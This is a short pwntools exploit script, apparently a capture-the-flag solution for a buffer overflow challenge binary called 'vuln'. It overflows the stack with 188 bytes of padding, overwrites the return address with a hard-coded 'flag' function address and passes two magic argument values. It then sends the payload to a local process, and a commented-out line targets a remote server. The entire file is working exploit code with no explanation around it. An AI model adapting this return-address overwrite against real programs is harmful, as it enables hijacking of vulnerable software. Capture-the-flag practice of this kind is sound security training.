#!/bin/python

from pwn import *
from pwn import p32

# p = remote('134.209.179.69',31452)

elf = ELF('./vuln')
p = elf.process()

# NOTE: Possible to get flag function address from elf file this way
# p32(elf.symbols['flag'], endian="little")

# padding + flag address + PADD + comparisons
payload = cyclic_gen().get(188) + p32(0x080491e2) + b'PADD' + p32(0xdeadbeef) + p32(0xc0ded00d) + b"\r\n"

open('payload', 'wb').write(payload)

p.sendline(payload)
p.interactive()

